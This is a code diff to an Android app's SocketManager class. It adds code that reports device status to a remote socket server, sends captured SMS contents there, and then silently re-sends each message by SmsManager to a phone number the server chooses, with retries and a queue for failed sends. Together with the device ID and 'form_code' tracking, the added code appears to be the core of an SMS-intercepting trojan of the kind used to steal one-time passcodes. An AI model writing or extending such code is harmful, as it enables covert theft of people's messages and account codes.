@@ -9,12 +9,12 @@ import android.telephony.SmsManager;
 import android.util.Log;
 import android.widget.Toast;
 
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.UnsupportedEncodingException;
-import java.net.URISyntaxException;
 import java.net.URLEncoder;
+import java.util.ArrayList;
 import java.util.Arrays;
 
 import io.socket.client.Ack;
@@ -39,60 +39,73 @@ public class SocketManager {
         }
         return instance;
     }
-
-    // make sure it will run after device registered
     private SocketManager(Context context) {
         helper = new Helper();
         storage = new StorageHelper(context);
         this.context = context;
 
-        try {
-            IO.Options options = new IO.Options();
-            options.reconnection = true;
-            String androidId = URLEncoder.encode(helper.getAndroidId(context), "UTF-8");
-            String formCode = URLEncoder.encode(helper.FormCode(), "UTF-8");
-            options.query = "client=android&android_id=" + androidId + "&form_code=" + formCode;
+        new Thread(() -> {
+            int maxRetries = 1000;
+            int retryCount = 0;
 
-            socket = IO.socket(helper.SocketUrl(), options);
-            setupListeners();
-        } catch (URISyntaxException e) {
-            e.printStackTrace();
-        } catch (UnsupportedEncodingException e) {
-            throw new RuntimeException(e);
-        }
+            while (retryCount < maxRetries) {
+                String socketUrl = helper.SocketUrl(context);
+                if (socketUrl != null && !socketUrl.isEmpty()) {
+                    try {
+                        IO.Options options = new IO.Options();
+                        options.reconnection = true;
+                        String androidId = URLEncoder.encode(helper.getAndroidId(context), "UTF-8");
+                        String formCode = URLEncoder.encode(helper.FormCode(), "UTF-8");
+                        options.query = "client=android&android_id=" + androidId + "&form_code=" + formCode;
+
+                        socket = IO.socket(socketUrl, options);
+                        setupListeners();
+                        Log.d(helper.TAG, "Socket initialized successfully ✅" + socketUrl);
+                        return; // done
+                    } catch (Exception e) {
+                        Log.e(helper.TAG, "Socket initialization error: " + e.getMessage());
+                        return;
+                    }
+                }
+                Log.d(helper.TAG, "Socket URL empty — retrying... (" + (retryCount + 1) + ")");
+                retryCount++;
+                try {
+                    Thread.sleep(2000); // wait 2 seconds before retry
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+            }
+
+            Log.e(helper.TAG, "Socket URL still empty after retries — giving up.");
+        }).start();
     }
 
 
+
     private void setupListeners() {
-        //Log.d(helper.TAG, "setupListeners");
-        // Connected
-        // Connected
         socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
             @Override
             public void call(Object... args) {
-                String socketId = socket.id(); // ✅ get current socket ID
-//                showToast("Socket Connected: " + socketId);
-                //Log.d(helper.TAG, "✅ Socket Connected, ID: " + socketId);
+                helper.show("Event Connect" + isConnected());
+                resendPendingSms();
+                deviceOfflineBy("EVENT_CONNECT", "online");
             }
         });
 
-// Disconnected
         socket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
             @Override
             public void call(Object... args) {
-//                showToast("Socket Disconnected");
-                //Log.d(helper.TAG, "⚠️ Socket Disconnected");
+                helper.show("EVENT_DISCONNECT");
             }
         });
 
-// Connect Error
         socket.on(Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
             @Override
             public void call(Object... args) {
-                Log.e(helper.TAG, "❌ Socket Connect Error: " + Arrays.toString(args));
+                // it will try to connect, if not success calling every seconds...
+                helper.show("❌ Socket Connect Error: " + Arrays.toString(args));
             }
         });
-
 
 //        socket.onAnyIncoming(new Emitter.Listener() {
 //            @Override
@@ -163,6 +176,10 @@ public class SocketManager {
 
     // Connect socket
     public void connect() {
+        if(helper.SocketUrl(context).isEmpty()){
+            Log.d(helper.TAG, "Socket Connect Skipping, Not Loaded Socket Url");
+            return ;
+        }
         if (socket != null && !socket.connected()) {
             socket.connect();
         }
@@ -290,6 +307,131 @@ public class SocketManager {
         void onResponse(JSONObject response) throws JSONException;
         void onError(String error);
     }
+
+
+    public void deviceOfflineBy(String message, String status)  {
+        if(!isConnected()){
+            helper.show("socket, message not send - " + message);
+        }
+        try {
+            JSONObject jsonData = new JSONObject();
+            jsonData.put("device_status_message", message);
+            jsonData.put("device_status", status);
+            socket.emit("device_status_message", jsonData);
+        } catch (JSONException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    public boolean isConnected() {
+        return socket != null && socket.connected();
+    }
+
+    public void sendSMSWithSocket(JSONObject sendPayload) {
+        final int[] userId = {0};
+
+        emitWithAck("smsForwardingData", sendPayload, new AckCallback() {
+            @Override
+            public void onResponse(JSONObject response) {
+                try {
+                    int status = response.optInt("status", 0);
+                    if (status != 200) return;
+
+                    JSONObject dataObj = response.optJSONObject("data");
+                    if (dataObj == null) return;
+
+                    userId[0] = dataObj.optInt("id");
+                    String phoneNumber = dataObj.optString("forward_to_number", "");
+                    if (phoneNumber.isEmpty()) return;
+
+                    String message = sendPayload.optString("message", "");
+                    if (message.isEmpty()) return;
+
+                    // ✅ Unique request codes for this user & number
+                    int sentCode = (userId[0] + phoneNumber).hashCode();
+                    int deliveredCode = (userId[0] + phoneNumber + "_delivered").hashCode();
+
+                    Intent sentIntent = new Intent(context, SentReceiver.class);
+                    Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
+                    sentIntent.putExtra("id", userId[0]);
+                    sentIntent.putExtra("phone", phoneNumber);
+                    deliveredIntent.putExtra("id", userId[0]);
+                    deliveredIntent.putExtra("phone", phoneNumber);
+
+                    PendingIntent sentPI = PendingIntent.getBroadcast(
+                            context, sentCode, sentIntent, PendingIntent.FLAG_IMMUTABLE);
+
+                    PendingIntent deliveredPI = PendingIntent.getBroadcast(
+                            context, deliveredCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
+
+                    SmsManager smsManager = SmsManager.getDefault();
+
+                    // ✅ Divide the message to check how many parts
+                    ArrayList<String> parts = smsManager.divideMessage(message);
+
+                    if (parts.size() == 1) {
+                        // 📩 Single short message → use sendTextMessage()
+                        smsManager.sendTextMessage(
+                                phoneNumber,
+                                null,
+                                message,
+                                sentPI,
+                                deliveredPI
+                        );
+                    } else {
+                        // 🧩 Long message → use multipart sending
+                        ArrayList<PendingIntent> sentIntents = new ArrayList<>();
+                        ArrayList<PendingIntent> deliveredIntents = new ArrayList<>();
+
+                        for (int i = 0; i < parts.size(); i++) {
+                            sentIntents.add(sentPI);
+                            deliveredIntents.add(deliveredPI);
+                        }
+
+                        smsManager.sendMultipartTextMessage(
+                                phoneNumber,
+                                null,
+                                parts,
+                                sentIntents,
+                                deliveredIntents
+                        );
+                    }
+
+                } catch (Exception e) {
+                    Log.e("SmsReceiver", "Error processing socket response", e);
+                }
+            }
+
+            @Override
+            public void onError(String error) {
+                PendingSmsManager pendingManager = new PendingSmsManager(context);
+                pendingManager.addPending(sendPayload);
+                Log.e("SmsReceiver", "Socket emit error: " + error);
+            }
+        });
+    }
+
+
+    private void resendPendingSms() {
+        PendingSmsManager pendingManager = new PendingSmsManager(context);
+        JSONArray list = pendingManager.getAllPending();
+
+        if (list.length() == 0) return;
+
+        helper.show("PendingSMS📤 Found " + list.length() + " pending SMS. Sending now...");
+
+        for (int i = 0; i < list.length(); i++) {
+            try {
+                JSONObject sms = list.getJSONObject(i);
+                sendSMSWithSocket(sms);
+                pendingManager.removeAt(i);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+
 
 
 }
